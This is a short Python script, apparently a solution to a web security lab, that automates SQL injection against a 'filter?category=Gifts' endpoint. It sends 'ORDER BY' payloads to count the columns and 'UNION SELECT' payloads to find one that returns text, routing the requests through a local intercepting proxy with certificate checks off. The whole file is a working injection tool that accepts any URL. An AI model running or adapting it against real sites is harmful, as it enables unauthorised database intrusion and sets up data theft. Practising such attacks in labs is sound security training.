import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range (1, 50):
        payload = "' ORDER BY %s--"%i
        r = requests.get(url+path+payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res: 
            return i-1
    return False

def exploit_sqli_string_field(url, num_col):
    string = "'5Yki6W'"
    path = "filter?category=Gifts"
    for i in range(1, num_col+1):
        tlist = ["Null"] * num_col
        tlist[i-1] = string
        injection = "' UNION SELECT " + ','.join(tlist) + '--'
        r = requests.get(url + path + injection, verify=False, proxies=proxies)
        if string.strip("'") in r.text:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")